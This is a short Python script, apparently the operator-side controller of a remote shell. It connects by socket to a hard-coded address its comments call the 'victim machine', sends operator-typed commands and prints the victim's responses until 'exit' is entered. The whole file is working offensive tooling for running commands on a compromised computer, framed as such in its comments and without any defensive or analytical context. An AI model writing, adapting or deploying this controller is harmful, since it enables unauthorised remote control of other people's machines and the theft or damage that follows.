from socket import socket

# Define the server address and port (Always of the victim machine)
server_address = ('192.168.1.11', 5000)

# Create the client socket, as we re-establish the connection for each command executed
client_socket = socket()
client_socket.connect(server_address)
state = True

while state:

    # Ask the user to input a command
    command_send = input("Enter the command you want to send to the victim machine (or 'exit' to quit): ")

    # If the user enters "exit", close the connection and exit the loop
    if command_send == 'exit':
        # Tell the server that we are closing the connection:
        client_socket.send(command_send.encode())
        # Close the socket, which will reopen at the beginning of the loop:
        client_socket.close()
        state = False
    else:
        # Send the command to the victim machine:
        client_socket.send(command_send.encode())

        # Wait to receive the response from the victim and store it in the variable 'response'.
        response = client_socket.recv(4096)

        # Print the response;
        print(response.decode())
